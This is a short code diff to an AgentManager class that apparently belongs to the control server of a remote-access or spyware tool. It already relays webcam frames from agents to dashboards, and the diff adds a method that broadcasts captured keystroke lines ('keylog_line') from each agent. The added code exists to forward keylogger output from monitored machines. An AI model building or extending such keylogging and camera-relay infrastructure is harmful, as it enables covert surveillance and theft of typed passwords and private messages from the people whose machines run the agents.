@@ -192,7 +192,11 @@ class AgentManager:
         await self._broadcast_to_dashboards(payload)
 
     async def relay_camera_to_dashboards(self, agent_id: str, frame: Dict[str, Any]) -> None:
-        payload = {"type": "camera_frame", "agent_id": agent_id, **frame}
+        payload = {"type": "camera_frame", "agent_id": str(agent_id), **frame}
+        await self._broadcast_to_dashboards(payload)
+
+    async def relay_keylog_to_dashboards(self, agent_id: str, line: str) -> None:
+        payload = {"type": "keylog_line", "agent_id": str(agent_id), "line": line}
         await self._broadcast_to_dashboards(payload)
 
     async def get_agent_http_base(self, agent_id: str) -> str | None:
